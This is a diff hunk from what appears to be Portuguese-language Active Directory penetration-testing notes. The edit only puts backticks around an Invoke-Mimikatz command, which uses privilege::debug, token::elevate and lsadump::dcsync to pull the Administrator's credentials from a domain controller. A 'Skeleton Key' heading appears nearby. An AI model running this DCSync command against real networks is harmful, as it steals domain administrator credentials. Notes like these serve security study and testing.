@@ -233,7 +233,7 @@ cd.local → Get-DomainSID -Domain cd.local
 
 Sempre lembrar do privilege::debug e do token::elevate
 
-Invoke-Mimikatz -Command "privilege::debug" "token::elevate" "lsadump::dcsync /domain:ab.cd.local /user:Administrator” “exit”
+`Invoke-Mimikatz -Command "privilege::debug" "token::elevate" "lsadump::dcsync /domain:ab.cd.local /user:Administrator” “exit”`
 
 ## Skeleton Key 
 
